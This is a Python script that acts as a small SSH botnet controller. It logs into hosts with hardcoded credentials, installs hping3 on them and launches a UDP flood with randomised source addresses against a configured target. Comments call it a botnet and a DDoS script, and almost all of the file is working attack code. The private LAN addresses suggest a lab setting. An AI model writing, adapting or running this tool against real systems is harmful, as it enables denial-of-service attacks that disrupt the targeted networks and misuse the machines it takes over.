from pexpect import pxssh
from threading import Thread


#ToDo
#fix bots being added if connection fails
#run ddos script
#create better way to add hosts



###########################################################################################################
###########################################################################################################
############################                     Config                    ################################
###########################################################################################################
###########################################################################################################

#change defaults to match network
starthost=72
endhost=73
defaultipaddress='192.168.1.'
passwd='Password1'
usern='ubuntu'
#by default ubuntu can have 10 sessions, any number over this may cause unexpected results use number > 10 at own risk
numberofsessions=5


#select target
targetipaddress='192.168.0.1'

#set to download script onto bots
downloadfile = ''
#escalates privileges first then runs hping3 udp flood
startscript = 'sudo hping3 '+ targetipaddress + ' -q -n --udp -d 110 -p 53 --flood --rand-source' + '\015' + passwd
#closes all connections
closeconnection = 'exit \015'
installhping = 'sudo apt-get install hping3' + '\015' + passwd  + '\015' + 'y'

###########################################################################################################
###########################################################################################################
###########################################################################################################
###########################################################################################################
###########################################################################################################
print('list of bots')


class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            print(self.host)
            return bot
        except Exception as e:
            print('Connection failure ' + self.host)
            print(e)



    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(bot, command):
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)
        print('\n')

# list of bots in botnet
botnet = []
failedconnection = []

# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)


#add all hosts defined in network
#while starthost <= endhost:
#    add_bot(defaultipaddress + str(starthost), usern, passwd)
 #   starthost +=1

add_bot('192.168.86.47', 'ubuntu', 'Password1')
#add_bot('192.168.1.63', 'ubuntu1', 'Password1')



#add wget ddos script
print('\ndownloading script on bots')

#runs function download file on all pcs simultaniously
for bot in botnet:
    Thread(target=command_bots, args=(bot, installhping, )).start()
    
for bot in botnet:
    Thread(target=command_bots, args=(bot, startscript, )).start()

#start ddos script one dos attack per session per thread
#print('\nrunning script on bots')       
#for bot in botnet:
#    for i in range(numberofsessions):
 #       Thread(target=command_bots, args=(bot, startscript, )).start()
  
#closes each bots connection as to avoid potential problems        
#for bot in botnet:
 #   for i in range(numberofsessions):
 #       Thread(target=command_bots, args=(bot, closeconnection, )).start()   
